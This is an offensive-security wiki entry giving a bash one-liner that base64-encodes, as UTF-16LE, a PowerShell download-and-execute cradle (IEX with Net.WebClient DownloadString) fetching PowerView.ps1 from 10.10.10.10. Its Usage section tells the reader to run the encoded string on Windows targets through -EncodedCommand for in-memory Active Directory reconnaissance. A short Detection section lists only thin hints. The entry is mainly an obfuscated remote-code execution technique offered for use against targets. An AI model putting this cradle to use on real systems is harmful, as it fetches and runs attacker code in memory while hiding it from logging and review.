---
id: 3658f9f7-c81d-42e3-ba04-41865391054b
type: code
language: bash
verified: true
created_at: '2023-04-06T03:56:24.012081+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - bash
  - encoding
  - powershell
validated: true
---

# Bash-Encode-PowerShell-Download

## Code

```ps1
echo 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' | iconv -t utf-16le | base64 -w 0
```

## Description

This Bash code snippet encodes a PowerShell command for downloading and executing PowerView.ps1 into base64 with UTF-16LE encoding, compatible with PowerShell's -EncodedCommand. It pipes echo output through iconv for encoding conversion and base64 for obfuscation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Command in echo | Raw PowerShell download command | 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' |
| URL in echo | Server hosting the script | http://10.10.10.10/PowerView.ps1 |

## Usage

Execute on a Linux attacker machine to produce the encoded string for Windows targets. Copy the output and use in powershell.exe -EncodedCommand for in-memory execution of PowerView during AD reconnaissance.

## Detection

- Proxy logs showing base64 generation or unusual iconv usage.
- On target: Same as PowerShell detection for decoded execution.

## Related

- [[procedures/Download-and-Execute-PowerView-for-AD-Reconnaissance]]
- [[tools/PowerView]]
